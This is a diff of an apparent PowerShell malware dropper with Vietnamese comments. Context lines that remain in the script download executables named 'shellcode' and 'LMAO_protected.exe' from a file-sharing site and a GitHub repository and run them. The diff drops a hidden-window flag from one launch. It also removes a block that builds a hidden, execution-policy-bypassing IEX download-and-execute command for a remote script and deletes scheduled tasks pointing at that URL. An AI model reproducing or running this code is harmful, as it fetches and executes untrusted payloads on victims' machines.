@@ -35,7 +35,7 @@ Invoke-WebRequest -Uri "https://anonsharing.com/file/8b24841448995265/shellcode_
 Start-Process -FilePath "$temp\s.exe"
 
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skid.exe"
-Start-Process -FilePath "$temp\skid.exe" -WindowStyle Hidden
+Start-Process -FilePath "$temp\skid.exe"
 
 Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
     Write-Output $_.FullName
@@ -43,25 +43,3 @@ Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEac
 }
 
 # Định nghĩa biến $urlToCheck và $arguments
-$urlToCheck = "https://raw.githubusercontent.com/43a1723/test/main/download.ps1"
-$arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `& { IEX (New-Object Net.WebClient).DownloadString('$urlToCheck') }"
-
-# Lấy danh sách tất cả các tác vụ đã lên lịch
-$tasks = Get-ScheduledTask
-
-foreach ($task in $tasks) {
-    try {
-        # Lấy thông tin chi tiết về tác vụ
-        $taskInfo = Get-ScheduledTaskInfo -TaskName $task.TaskName
-        $taskAction = $taskInfo.Actions | Where-Object { $_.Execute -like "*powershell.exe*" }
-
-        # Kiểm tra xem hành động của tác vụ có chứa URL cụ thể không
-        if ($taskAction.Argument -like "*$urlToCheck*" -and $taskAction.Argument -ne $arguments) {
-            # Nếu hành động chứa URL cần xoá và không chứa $arguments, xoá tác vụ
-            Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false
-            Write-Output "Task $($task.TaskName) has been deleted."
-        }
-    } catch {
-        Write-Output "Failed to process task $($task.TaskName): $_"
-    }
-}
